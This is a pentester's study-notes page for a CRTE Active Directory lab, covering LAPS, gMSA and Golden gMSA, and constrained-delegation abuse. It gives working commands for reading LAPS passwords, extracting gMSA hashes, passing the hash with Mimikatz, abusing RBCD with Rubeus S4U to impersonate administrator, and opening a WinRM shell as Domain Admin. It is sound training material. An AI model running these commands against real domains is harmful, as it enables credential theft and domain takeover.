@@ -1,0 +1,767 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>2 - AD Privesc |</title>
+<meta name="description" content="LAPS, gMSA and Constrained Deleg ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="2 - AD Privesc">
+<meta property="og:url" content="http://localhost:4000/notes/crte/adprivesc/">
+
+
+  <meta property="og:description" content="LAPS, gMSA and Constrained Deleg ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header9.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-28T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/crte/adprivesc/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header9.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          2 - AD Privesc
+
+        
+      </h1>
+      
+        <p class="page__lead">LAPS, gMSA and Constrained Deleg
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  3 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/" class="active">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="2 - AD Privesc">
+    <meta itemprop="description" content="LAPS, gMSA and Constrained Deleg">
+    <meta itemprop="datePublished" content="2023-12-28T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#ad-privesc">AD Privesc</a>
+    <ul>
+      <li><a href="#laps">LAPS</a></li>
+      <li><a href="#gmsa">gMSA</a></li>
+      <li><a href="#golden-gmsa">Golden gMSA</a></li>
+      <li><a href="#contrained-delegation-kerberos-only">Contrained Delegation (Kerberos Only)</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="ad-privesc">AD Privesc</h1>
+
+<p>Some content is the same as in CRTP:</p>
+
+<p><a href="https://MashrurRahmanRawnok.github.io/notes/crtp/domprivesc/">CRTP AD Privilege Escalation</a></p>
+
+<h2 id="laps">LAPS</h2>
+
+<p>LAPS (Local Administrator Password Solution) provides centralized storage of local users passwords in AD with periodic randomizing.</p>
+
+<blockquote>
+  <p><em>…it mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers.</em></p>
+</blockquote>
+
+<ul>
+  <li>Storage in clear text, transmission is encrypted (Kerberos).</li>
+  <li>Configurable using GPO.</li>
+  <li>Access control for reading clear text passwords using ACLs.</li>
+  <li>Only Domain Admins and explicitly allowed users can read the passwords.</li>
+</ul>
+
+<p><img src="/assets/images/posts/crte/1.png" alt="Alt text" class="align-center" /></p>
+
+<p>On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\LAPS\CSE\</span><span class="w"> </span><span class="nx">directory.</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>To find users who can read the passwords in clear text machines in OUs</strong></p>
+
+<p>PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainOU</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'ms-Mcs-AdmPwd'</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'ReadProperty'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text</strong></p>
+
+<p>Using Active Directory module</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-LapsPermissions.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using LAPS module (can be copied across machines):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1</span><span class="w">
+</span><span class="n">Find-AdmPwdExtendedRights</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">OUDistinguishedName</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Once we compromise the user which has the Rights, use the following to read clear-text passwords</strong></p>
+
+<p>PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">targetmachine</span><span class="err">$&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">ExpandProperty</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Active Directory module:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">targetmachine</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">ms-mcs-admpwd</span><span class="w">
+</span></code></pre></div></div>
+
+<p>LAPS module:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AdmPwdPassword</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">targetmachine</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="gmsa">gMSA</h2>
+
+<p>A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers.</p>
+
+<blockquote>
+  <p>Use of gMSA is recommended to protect from Kerberoast type attacks!</p>
+</blockquote>
+
+<ul>
+  <li>A 256 bytes random password is generated and is rotated every 30 days.</li>
+  <li>When an authorized user reads the attribute ‘msds-ManagedPassword’ the gMSA password is computed.</li>
+  <li>Only explicitly specified principals can read the password blob.</li>
+  <li>Even the <strong>Domain Admins can’t read it by default</strong>.</li>
+</ul>
+
+<p><strong>A gMSA has object class <em>msDS-GroupManagedServiceAccount</em>. This can be used to find the accounts</strong></p>
+
+<p>Using ADModule:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainObject</span><span class="w"> </span><span class="nt">-LDAPFilter</span><span class="w"> </span><span class="s1">'(objectClass=msDS-GroupManagedServiceAccount)'</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>The attribute *msDS-GroupMSAMembership</strong> (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob**</p>
+
+<p>Read it using ADModule:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jumpone</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">PrincipalsAllowedToRetrieveManagedPassword</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>The attribute <em>msDS-ManagedPassword</em> stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB</strong></p>
+
+<p>Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Passwordblob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jumpone</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1</span><span class="w">
+</span><span class="nv">$decodedpwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="nv">$Passwordblob</span><span class="w">
+</span><span class="n">ConvertTo-NTHash</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nv">$decodedpwd</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>The <em>CurrentPassword</em> attribute in the $decodedpwd contains the clear-text password but cannot be typed!</strong></p>
+
+<p>Passing the NTLM hash of the gMSA, we get privileges of the gMSA:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekurlsa::pth</span><span class="w"> </span><span class="nx">/user:jumpone</span><span class="w"> </span><span class="nx">/domain:us.techcorp.local</span><span class="w"> </span><span class="nx">/ntlm:0a02c684cc0fa1744195edd1aec43078</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>We can access the services and machines (server farms) that the account has access to</strong></p>
+
+<h2 id="golden-gmsa">Golden gMSA</h2>
+
+<p><strong>gMSA password is calculated by leveraging the secret stored in KDS root key object</strong></p>
+
+<p>We need following attributes of the KDS root key to compute the Group Key Envelope (GKE):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="w"> </span><span class="n">cn</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="nx">msKds-SecretAgreementParam</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="n">msKds-RootKeyData</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="nx">msKds-KDFParam</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="n">msKds-KDFAlgorithmID</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="nx">msKds-CreateTime</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="n">msKds-UseStartTime</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="nx">msKds-Version</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="n">msKds-DomainID</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="nx">msKds-PrivateKeyLength</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="n">msKds-PublicKeyLength</span><span class="w">
+</span><span class="o">-</span><span class="w"> </span><span class="nx">msKds-SecretAgreementAlgorithmID</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Once we compute the GKE for the associated KDS root key we can generate the password offline.</li>
+  <li>Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key.</li>
+  <li>Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.</li>
+  <li>Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline.</li>
+</ul>
+
+<h2 id="contrained-delegation-kerberos-only">Contrained Delegation (Kerberos Only)</h2>
+
+<blockquote>
+  <p>It requires an additional forwardable ticket to invoke S4U2Proxy.</p>
+</blockquote>
+
+<ul>
+  <li>We cannot use S4U2Self as the service doesn’t have TRUSTED_TO_AUTH_FOR_DELEGATION value configured.</li>
+</ul>
+
+<p>We can leverage RBCD to abuse Kerberos Only configuration:</p>
+
+<ol>
+  <li>Create a new Machine Account</li>
+  <li>Configure RBCD on the machine configured with Constrained Delegation.</li>
+  <li>Obtain a TGS/Service Ticket for the machine configured with Constrained</li>
+</ol>
+
+<p>Delegation by leveraging the newly created Machine Account:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Request</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">forwardable</span><span class="w"> </span><span class="nx">TGS/Service</span><span class="w"> </span><span class="nx">Ticket</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">leveraging</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">ticket</span><span class="w"> </span><span class="nx">created</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">previous</span><span class="w"> </span><span class="nx">step.</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Enumerate constrained delegation using ADModule:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Since <strong>ms-DS-MachineAccountQuota is set to 10</strong> for all domain users, any domain user can create a new Machine Account and join the same in the current domain.</p>
+
+<p>Create a new Machine Account using Powermad.ps1 script:</p>
+
+<p><a href="https://github.com/Kevin-Robertson/Powermad">Powermad on GitHub</a></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Powermad\Powermad.ps1</span><span class="w">
+</span><span class="nx">New-MachineAccount</span><span class="w"> </span><span class="nt">-MachineAccount</span><span class="w"> </span><span class="nx">studentcompX</span><span class="w">
+</span></code></pre></div></div>
+<p><strong>We already compromised us-mgmt</strong></p>
+
+<p><strong>Configure RBCD</strong> on us-mgmt using us-mgmt$ computer account:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:us-mgmt</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/domain:us.techcorp.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span></code></pre></div></div>
+<p>Using ADModule:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">us-mgmt</span><span class="err">$</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nx">studentcompX</span><span class="err">$</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Obtain a TGS/Service Ticket</strong> for us-mgmt (machine configured with Constrained Delegation) by leveraging the newly created Machine Account (studentcompx):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:P</span><span class="err">@</span><span class="nx">ssword</span><span class="err">@</span><span class="nx">123</span><span class="w">
+</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/user:studentcompX</span><span class="err">$</span><span class="w"> </span><span class="nx">/rc4:D3E5739141450E529B07469904FE8BDC</span><span class="w"> </span><span class="nx">/msdsspn:cifs/us-mgmt.us.techcorp.local</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/tgs:doIGxjCCBsKgAwIBBaEDAgEWoo...</span><span class="w"> </span><span class="nx">/user:us-mgmt</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2</span><span class="w"> </span><span class="nx">/msdsspn:cifs/us-mssql.us.techcorp.local</span><span class="w"> </span><span class="nx">/altservice:http</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Access the us-mssql using WinRM as the Domain Admin</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-mssql.us.techcorp.local</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
+</span></code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#intermediate" class="page__taxonomy-item" rel="tag">intermediate</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#privesc" class="page__taxonomy-item" rel="tag">privesc</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#crte" class="page__taxonomy-item" rel="tag">crte</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-28T00:00:00+06:00">December 28, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
